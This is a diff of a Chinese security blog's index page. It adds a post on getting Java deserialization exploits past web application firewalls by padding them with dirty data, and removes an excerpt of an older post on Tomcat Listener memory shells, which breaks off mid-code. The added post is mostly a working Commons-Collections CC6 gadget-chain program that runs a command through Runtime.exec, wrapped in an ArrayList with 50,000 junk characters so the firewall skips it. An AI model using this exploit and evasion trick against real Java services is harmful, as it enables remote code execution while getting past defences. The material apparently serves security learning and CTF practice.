@@ -147,7 +147,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-count">32</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -158,7 +158,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -175,6 +175,111 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/04/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95WAF%E4%B9%8B%E5%8A%A0%E5%A4%A7%E9%87%8F%E8%84%8F%E6%95%B0%E6%8D%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Sean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/04/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95WAF%E4%B9%8B%E5%8A%A0%E5%A4%A7%E9%87%8F%E8%84%8F%E6%95%B0%E6%8D%AE/" class="post-title-link" itemprop="url">Java反序列化绕WAF之加大量脏数据</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-04-28 10:39:06 / 修改时间：10:39:29" itemprop="dateCreated datePublished" datetime="2025-04-28T10:39:06+08:00">2025-04-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Ja2aV">Java反序列化绕WAF之加大量脏数据</h1>
+<h2 id="n7vIF">WAF背景</h2>
+大多数的WAF受限于性能影响，当request足够大时，WAF就可能因为性能原因而做出让步，超出检查长度的内容，将不会被检查。这一点在一些CTF的题目中有所体现。
+
+<p>虽然这样可以绕过检测，但是我们的序列化数据是二进制数据，直接加入垃圾数据破坏了序列化的结构，在readObject反序列化的时候并没有反序列化成功。</p>
+<h2 id="cU3wF">脏数据添加</h2>
+这里存在的思路是，找到一个可以序列化的类，可以将我们的脏数据和ysoserial gadget对象一起包裹起来。
+
+<p><strong>条件：</strong></p>
+<ul>
+<li>实现Serializable接口</li>
+<li>可以存储任意对象</li>
+</ul>
+<p>这么一看，集合类型就非常符合需求了。</p>
+<ol>
+<li>ArrayList</li>
+<li>LinkedList</li>
+<li>HashMap</li>
+<li>LinkedHashMap</li>
+<li>TreeMap</li>
+<li>……</li>
+</ol>
+<h2 id="IOivI">实现</h2>
+这里拿CC6的链子举例，我们需要构造一个dirtyData和一个集合类，将我们的dirtyData和入口类用该集合类包裹起来，进行序列化即可。
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.review.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dirty</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(entry, <span class="string">&quot;qwe&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">dirtyData</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">50000</span>;i++)&#123;</span><br><span class="line">            dirtyData += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        list.add(dirtyData);</span><br><span class="line">        list.add(expMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(list);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -2539,187 +2644,6 @@ EL（全称 Expression Language）表达式语言
 
 <p>启动tomcat服务后，访问我们上传的<code>addValve.jsp</code>后，Vlave内存马就被成功注入，后续访问任意路径，都会触发我们的Valve内存马</p>
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740108765334-e82c69bb-b0be-466e-8eb7-a2f1fc84acae.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/03/21/Listener%E5%86%85%E5%AD%98%E9%A9%AC/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Sean">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="肖恩的博客">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 肖恩的博客">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/03/21/Listener%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-title-link" itemprop="url">Listener内存马</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2025-03-21 10:54:37" itemprop="dateCreated datePublished" datetime="2025-03-21T10:54:37+08:00">2025-03-21</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-03-25 11:12:32" itemprop="dateModified" datetime="2025-03-25T11:12:32+08:00">2025-03-25</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="ruLRI">Listener内存马</h1>
-<h2 id="drSHJ">前置基础</h2>
-
-<p><font style="color:rgb(80, 80, 92);">Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</font></p>
-<p><strong><font style="color:rgb(80, 80, 92);">Listener三个域对象</font></strong></p>
-<ul>
-<li>ServletContextListener</li>
-<li>HttpSessionListener</li>
-<li>ServletRequestListener</li>
-</ul>
-<p><font style="color:rgb(80, 80, 92);">根据名字来看，ServletRequestListenner是最适合当作内存马的。从名字就知道，ServletRequestListener是用来监听ServletRequest对象的，当我们访问任意资源时，即可触发</font><code>ServletRequestListener#requestInitialized()</code><font style="color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);">方法</font></p>
-<h3 id="CR1KX">构建listener</h3>
-之前构建Filter内存马，需要定义一个实现好filter接口的类，Listener也是一样，需要定义一个实现好Listener接口的类
-
-<p>要实现listener的业务，就要实现<code>EventListener</code>，感觉和<code>Serializable</code>接口相似，只起了一个标记作用</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">package java.<span class="property">util</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A tagging interface that all event listener interfaces must extend.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public interface <span class="title class_">EventListener</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>EventListener</code>的实现类非常多，我们优先找Servlet开头的，方便去触发我们所构造的恶意Lisenter</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740051632668-b59d7e1d-f50c-4baf-abd5-0bad4306cd3a.png"></p>
-<p>我们找到了<code>ServletRequestListener</code></p>
-<p>感觉该监听器在我们每次发送请求时，都会触发其<code>requestInitialized</code>方法</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public interface <span class="title class_">ServletRequestListener</span> <span class="keyword">extends</span> <span class="title class_">EventListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> public <span class="keyword">void</span> <span class="title function_">requestDestroyed</span>(<span class="params">ServletRequestEvent sre</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> public <span class="keyword">void</span> <span class="title function_">requestInitialized</span>(<span class="params">ServletRequestEvent sre</span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>先构造一个简单的listener</p>
-<p><font style="color:rgb(80, 80, 92);">因为前面猜想 </font><code>requestInitialized()</code><font style="color:rgb(80, 80, 92);"> 方法可以触发 Listener 监控器，所以我们在 </font><code>requestInitialized()</code><font style="color:rgb(80, 80, 92);"> 方法里面加上一些代码，来证明它何时被执行。</font></p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.<span class="property">servlet</span>.<span class="property">ServletRequestEvent</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">servlet</span>.<span class="property">ServletRequestListener</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">servlet</span>.<span class="property">annotation</span>.<span class="property">WebListener</span>;</span><br><span class="line"></span><br><span class="line">@<span class="title class_">WebListener</span>(<span class="string">&quot;/listenerTest&quot;</span>)</span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">ListenerTest</span> implements <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">ListenerTest</span>()&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title class_">Override</span></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">requestDestroyed</span>(<span class="params">ServletRequestEvent sre</span>) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title class_">Override</span></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">requestInitialized</span>(<span class="params">ServletRequestEvent sre</span>) &#123;</span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;Listener Initialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>同样我们也需要在web.xml中配置</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;listener&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>ListenerTest<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span></span><br><span class="line">&lt;/listener&gt;</span><br></pre></td></tr></table></figure>
-
-<p>接下来在访问路径时，都会打印信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740052668225-37ead02c-f9ad-414a-b125-49cd8446d991.png"></p>
-<p><font style="color:rgb(80, 80, 92);">至此，Listener 基础代码实现完成，下面我们来分析 Listener 的运行流程。</font></p>
-<h2 id="chM1X"><font style="color:rgb(80, 80, 92);">分析</font></h2>
-<h3 id="G3Dyy">访问前</h3>
-
-<p>与servlet注册时相似，我们直接看到解析xml文件后做注册的地方<code>ContextConfig#configureContext</code></p>
-<p>将web.xml读取后，作为参数传入该方法中后，对servlet、filter、listener等组件进行配置</p>
-<p>调试<code>ContextConfig#configureContext</code>，我们可以看到，获取的web.xml中已经有了对应的Listener文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740053961879-7b95aad3-3465-4485-8eb6-084f293f0839.png"></p>
-<p>我们在这里重点关注listener的读取</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private <span class="keyword">void</span> <span class="title function_">configureContext</span>(<span class="params">WebXml webxml</span>) &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">for</span> (<span class="title class_">String</span> listener : webxml.<span class="title function_">getListeners</span>()) &#123;</span><br><span class="line">            context.<span class="title function_">addApplicationListener</span>(listener);</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们在此处下个断点，运行到这里</p>
-<p>这里的context是<code>StandardContext</code>，执行的是<code>StandardContext</code>的<code>addApplicationListener</code>方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740053700525-8b867fe1-c4d0-4aca-b895-92052e1a64aa.png"></p>
-<p><strong>在读取完web.xml文件后，需要去加载Listener</strong></p>
-<p><font style="color:rgb(80, 80, 92);">当我们读取完配置文件，当应用启动的时候，</font><code>StandardContext</code><font style="color:rgb(80, 80, 92);"> 会去调用 </font><code>listenerStart()</code><font style="color:rgb(80, 80, 92);"> 方法。这个方法做了一些基础的安全检查，最后完成简单的 start 业务。</font></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740054961265-c2caae24-9a9c-4af6-88e5-201e596da917.png"></p>
-<p><font style="color:rgb(80, 80, 92);">刚开始的地方，</font><code>listenerStart()</code><font style="color:rgb(80, 80, 92);"> 方法中有这么一个语句</font></p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">String</span> listeners[] = <span class="title function_">findApplicationListeners</span>();</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(80, 80, 92);">这里这个方法实际就是把之前的 Listener 返回，存放到listeners</font></p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title class_">Override</span></span><br><span class="line">    public <span class="title class_">String</span>[] <span class="title function_">findApplicationListeners</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> applicationListeners;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="rIKmD">访问后</h3>
-
-<p>把断点下在<code>requestInitialized</code>方法，开启调试，访问路径后走到这里</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740055305524-71187a36-c398-4d73-a0ae-23cdbcf0fbff.png"></p>
-<p>但这里只是我们所写的代码执行点，我们需要向上找，找到<code>StandardContext#fireRequestInitEvent</code>方法</p>
-<p>这里会调用<code>getApplicationEventListeners</code>方法，获取<code>ApplicationEventListeners</code>并存入<code>instances[]</code>中</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title class_">Override</span></span><br><span class="line">   public boolean <span class="title function_">fireRequestInitEvent</span>(<span class="params">ServletRequest request</span>) &#123;</span><br><span class="line"></span><br><span class="line">       <span class="title class_">Object</span> instances[] = <span class="title function_">getApplicationEventListeners</span>();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ((instances != <span class="literal">null</span>) &amp;&amp; (instances.<span class="property">length</span> &gt; <span class="number">0</span>)) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="title class_">ServletRequestEvent</span> event =</span><br><span class="line">                   <span class="keyword">new</span> <span class="title class_">ServletRequestEvent</span>(<span class="title function_">getServletContext</span>(), request);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> (<span class="title class_">Object</span> instance : instances) &#123;</span><br><span class="line">               <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">continue</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> <span class="title class_">ServletRequestListener</span>)) &#123;</span><br><span class="line">                   <span class="keyword">continue</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="title class_">ServletRequestListener</span> listener = (<span class="title class_">ServletRequestListener</span>) instance;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   listener.<span class="title function_">requestInitialized</span>(event);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (<span class="title class_">Throwable</span> t) &#123;</span><br><span class="line">                   <span class="title class_">ExceptionUtils</span>.<span class="title function_">handleThrowable</span>(t);</span><br><span class="line">                   <span class="title function_">getLogger</span>().<span class="title function_">error</span>(sm.<span class="title function_">getString</span>(</span><br><span class="line">                           <span class="string">&quot;standardContext.requestListener.requestInit&quot;</span>,</span><br><span class="line">                           instance.<span class="title function_">getClass</span>().<span class="title function_">getName</span>()), t);</span><br><span class="line">                   request.<span class="title function_">setAttribute</span>(<span class="title class_">RequestDispatcher</span>.<span class="property">ERROR_EXCEPTION</span>, t);</span><br><span class="line">                   <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们进入到<code>getApplicationEventListeners()</code>方法中，可以看到该方法只做了一件事：<font style="color:rgb(80, 80, 92);">获取一个 Listener 数组</font></p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title class_">Override</span></span><br><span class="line">    public <span class="title class_">Object</span>[] <span class="title function_">getApplicationEventListeners</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> applicationEventListenersList.<span class="title function_">toArray</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>后面的for循环，会从<font style="color:rgb(80, 80, 92);">Listener数组中，将listener一个一个取出来，去执行它的</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;requestInitialized&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">方法</font></p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="title class_">Object</span> instance : instances) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> <span class="title class_">ServletRequestListener</span>)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title class_">ServletRequestListener</span> listener = (<span class="title class_">ServletRequestListener</span>) instance;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    listener.<span class="title function_">requestInitialized</span>(event);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (<span class="title class_">Throwable</span> t) &#123;</span><br><span class="line">                    <span class="title class_">ExceptionUtils</span>.<span class="title function_">handleThrowable</span>(t);</span><br><span class="line">                    <span class="title function_">getLogger</span>().<span class="title function_">error</span>(sm.<span class="title function_">getString</span>(</span><br><span class="line">                            <span class="string">&quot;standardContext.requestListener.requestInit&quot;</span>,</span><br><span class="line">                            instance.<span class="title function_">getClass</span>().<span class="title function_">getName</span>()), t);</span><br><span class="line">                    request.<span class="title 